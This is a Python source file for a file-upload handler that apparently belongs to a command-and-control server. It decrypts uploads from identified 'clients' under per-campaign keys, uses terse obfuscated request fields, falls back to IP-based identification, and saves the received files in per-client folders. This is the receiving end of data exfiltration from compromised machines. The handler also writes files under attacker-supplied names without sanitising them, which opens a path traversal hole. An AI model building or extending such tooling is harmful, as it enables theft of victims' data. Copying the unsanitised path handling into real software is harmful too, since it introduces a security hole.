import os
import time
import json
import base64
import logging
from handlers.base_handler import BaseHandler

logger = logging.getLogger(__name__)

class FileHandler(BaseHandler):
    """Handler for file upload requests"""
    
    def handle(self):
        """Process file upload from client"""
        # Get content data
        content_length = int(self.headers.get('Content-Length', 0))
        if content_length == 0:
            self.send_error_response(400, "Missing content")
            return
            
        encrypted_data = self.request_handler.rfile.read(content_length).decode('utf-8')
        
        try:
            # Parse the request JSON to extract data part
            request_json = json.loads(encrypted_data)
            encrypted_data = request_json.get('d') or request_json.get('data')
            
            # Handle token field (discard padding - we don't need it)
            token = request_json.get('t', '') or request_json.get('token', '')
            if token:
                self.log_message(f"Received file upload with {len(token)} bytes of token padding")
            
            # Try client identification by key-based decryption
            client_id, decrypted_data = self.crypto_helper.identify_client_by_decryption(encrypted_data)
            
            # If client identification failed but client_id was provided in request
            if client_id is None:
                provided_client_id = request_json.get('c') or request_json.get('client_id') or request_json.get('id')
                
                if provided_client_id:
                    # Try decryption using the provided client ID
                    try:
                        decrypted_data = self.crypto_helper.decrypt(encrypted_data, provided_client_id)
                        client_id = provided_client_id
                    except Exception as e:
                        logger.error(f"Failed to decrypt using provided client ID: {e}")
            
            if client_id is None or decrypted_data is None:
                self.send_error_response(400, "Authentication failed - could not decrypt data")
                return
            
            # Save the file
            file_path = self._save_uploaded_file(client_id, decrypted_data)
            
            # Send success response
            self.send_success_response()
            
        except json.JSONDecodeError:
            # For backward compatibility, try directly as encrypted data
            try:
                # Use IP-based identification as fallback (less secure)
                client_id = self._identify_client_by_ip()
                
                if client_id:
                    # Try to decrypt using the client's key
                    decrypted_data = self.crypto_helper.decrypt(encrypted_data, client_id)
                else:
                    # Try using the campaign key
                    decrypted_data = self.crypto_helper.decrypt(encrypted_data)
                    client_id = self._identify_client_by_ip()  # Still need a client ID for saving
                
                # Save the file
                file_path = self._save_uploaded_file(client_id or self.client_address[0], decrypted_data)
                
                # Send success response
                self.send_success_response()
            except Exception as e:
                logger.error(f"Error handling legacy file upload: {e}")
                self.send_error_response(500, "Server Error")
        except Exception as e:
            logger.error(f"Error handling file upload: {e}")
            self.send_error_response(500, "Server Error")
    
    def _identify_client_by_ip(self):
        """Identify client based on IP address as fallback"""
        client_ip = self.client_address[0]
        for client_id, client_info in self.client_manager.get_clients_info().items():
            if client_info.get('ip') == client_ip:
                return client_id
        return None
            
    def _save_uploaded_file(self, client_id, file_content):
        """Save uploaded file content to disk"""
        # Prepare the uploads directory
        campaign_folder = self.get_campaign_folder()
        
        # Use client_id if available, otherwise use IP
        client_id_for_path = client_id or self.client_address[0]
        uploads_folder = os.path.join(campaign_folder, "uploads", client_id_for_path)
        os.makedirs(uploads_folder, exist_ok=True)
        
        # Try to parse as JSON for structured file upload
        try:
            file_info = json.loads(file_content)
            if isinstance(file_info, dict) and 'FileName' in file_info and 'FileContent' in file_info:
                # This is a structured file upload with filename and base64 content
                file_path = self._save_structured_file(uploads_folder, file_info, client_id)
                return file_path
            else:
                # Not a structured file upload, save as raw text
                return self._save_raw_file(uploads_folder, file_content, client_id)
        except json.JSONDecodeError:
            # Not JSON, save as raw text
            return self._save_raw_file(uploads_folder, file_content, client_id)
            
    def _save_structured_file(self, uploads_folder, file_info, client_id=None):
        """Save a structured file upload with filename and content"""
        file_name = file_info['FileName']
        file_content_base64 = file_info['FileContent']
        
        try:
            # Decode base64 content
            file_content_bytes = base64.b64decode(file_content_base64)
            
            # Save to file
            file_path = os.path.join(uploads_folder, file_name)
            with open(file_path, 'wb') as f:
                f.write(file_content_bytes)
            
            # Log the upload
            self.log_message(f"File uploaded from {client_id or self.client_address[0]}: {file_name} ({len(file_content_bytes)} bytes)")
            if client_id:
                self.client_manager.log_event(client_id, "File Upload", f"File saved to {file_path}")
                
            return file_path
        except Exception as e:
            logger.error(f"Error saving structured file: {e}")
            raise
            
    def _save_raw_file(self, uploads_folder, content, client_id=None):
        """Save raw text content as a file"""
        timestamp = time.strftime("%Y%m%d-%H%M%S")
        file_path = os.path.join(uploads_folder, f"upload_{timestamp}.txt")
        
        with open(file_path, 'w') as f:
            f.write(content)
            
        self.log_message(f"Raw text uploaded from {client_id or self.client_address[0]} and saved to {file_path}")
        if client_id:
            self.client_manager.log_event(client_id, "File Upload", f"Raw text saved to {file_path}")
            
        return file_path